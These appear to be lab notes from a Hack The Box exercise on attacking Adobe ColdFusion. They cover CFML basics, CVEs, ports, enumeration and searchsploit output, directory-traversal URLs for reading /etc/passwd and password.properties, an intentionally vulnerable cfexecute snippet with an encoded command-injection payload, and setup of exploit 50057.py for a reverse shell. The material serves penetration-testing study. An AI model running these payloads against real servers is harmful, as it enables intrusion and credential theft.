

        ColdFusion is a programming language and a web application development platform based on Java. ColdFusion was initially developed by the Allaire Corporation in 1995 and was acquired by Macromedia in 2001. Macromedia was later acquired by Adobe Systems, which now owns and develops ColdFusion.


        ColdFusion Markup Language (CFML) is the proprietary programming language used in ColdFusion to develop dynamic web applications. It has a syntax similar to HTML, making it easy to learn for web developersCFML includes tags and functions for database integration, web services, email management, and other common web development tasks


        the cfquery tag can execute SQL statements to retrieve data from a database:

        <cfquery name="myQuery" datasource="myDataSource">
        SELECT *
        FROM myTable
        </cfquery>

        we can then use the cfloop tag to iterate through the records retrieved from the database:

        <cfloop query="myQuery">
        <p>#myQuery.firstName# #myQuery.lastName#</p>
        </cfloop>



         Here are a few known vulnerabilities of ColdFusion:

            CVE-2021-21087: Arbitrary disallow of uploading JSP source code
            
            CVE-2020-24453: Active Directory integration misconfiguration
            
            CVE-2020-24450: Command injection vulnerability
           
            CVE-2020-24449: Arbitrary file reading vulnerability
           
            CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability



        ColdFusion exposes a fair few ports by default:

        80 	HTTP 	Used for non-secure HTTP communication between the web server and web browser.
        
        443 	HTTPS 	Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.
       
        1935 	RPC 	Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.
        
        25 	SMTP 	Simple Mail Transfer Protocol (SMTP) is used for sending email messages.
       
        8500 	SSL 	Used for server communication via Secure Socket Layer (SSL).
       
        5500 	Server Monitor 	Used for remote administration of the ColdFusion server.




            -Enumeration


        Method 	                Description
        
        Port Scanning 	ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically.
        
        File Extensions 	ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.
        
        HTTP Headers 	Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.
        
        Error Messages 	If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.
        
        Default Files 	ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.



            -Searchsploit

        $ searchsploit adobe coldfusion

------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                        | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                       | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Script | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query Strin | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-S | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Si | cfm/webapps/33168.txt
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results


            -Directory Traversal
        


        The attack can be executed by manipulating the input parameters in ColdFusion tags such as CFFile and CFDIRECTORY, which are used for file and directory operations such as uploading, downloading, and listing files.


        <cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
        <cfloop query="fileList">
            <a href="uploads/#fileList.name#">#fileList.name#</a><br>
        </cfloop>

        In this code snippet, the ColdFusion cfdirectory tag lists the contents of the uploads directory, and the cfloop tag is used to loop through the query results and display the filenames as clickable links in HTML.

        However, the directory parameter is not validated correctly, which makes the application vulnerable to a Path Traversal attack. An attacker can exploit this vulnerability by manipulating the directory parameter to access files outside the uploads directory.

        http://example.com/index.cfm?directory=../../../etc/&file=passwd

        CVE-2010-2861 is the Adobe ColdFusion - Directory Traversal exploit discovered by searchsploit. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.

                CFIDE/administrator/settings/mappings.cfm
                logging/settings.cfm
                datasources/index.cfm
                j2eepackaging/editarchive.cfm
                CFIDE/administrator/enter.cfm


        These ColdFusion files are vulnerable to a directory traversal attack in Adobe ColdFusion 9.0.1 and earlier versions. Remote attackers can exploit this vulnerability to read arbitrary files by manipulating the locale parameter in these specific ColdFusion files.


        http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en



        http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd


        The password.properties file in ColdFusion is a configuration file that securely stores encrypted passwords for various services and resources the ColdFusion server uses.It contains a list of key-value pairs, where the key represents the resource name and the value is the encrypted password. These encrypted passwords are used for services like database connections, mail servers, LDAP servers, and other resources that require authentication.The file is usually in the [cf_root]/lib directory and can be managed through the ColdFusion Administrator.

        $ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"



                --Unauthenticated RCE

        Take the following code:

        <cfset cmd = "#cgi.query_string#">
        <cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">

        In the above code, the cmd variable is created by concatenating the cgi.query_string variable with a command to be executed. This command is then executed using the cfexecute function, which runs the Windows cmd.exe program with the specified arguments. This code is vulnerable to an unauthenticated RCE attack because it does not properly validate the cmd variable before executing it, nor does it require the user to be authenticated. An attacker could simply pass a malicious command as the cgi.query_string variable, and it would be executed by the server.


        # Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

        http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt


        An example of a ColdFusion Unauthenticated RCE attack is the CVE-2009-2265 vulnerability that affected Adobe ColdFusion versions 8.0.1 and earlier. This exploit allowed unauthenticated users to upload files and gain remote code execution on the target host. The vulnerability exists in the FCKeditor package, and is accessible on the following path:

        http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=


        $ searchsploit -p 50057


        $ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .

        --Exploit Modification

        if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex


        $python3 50057.py

        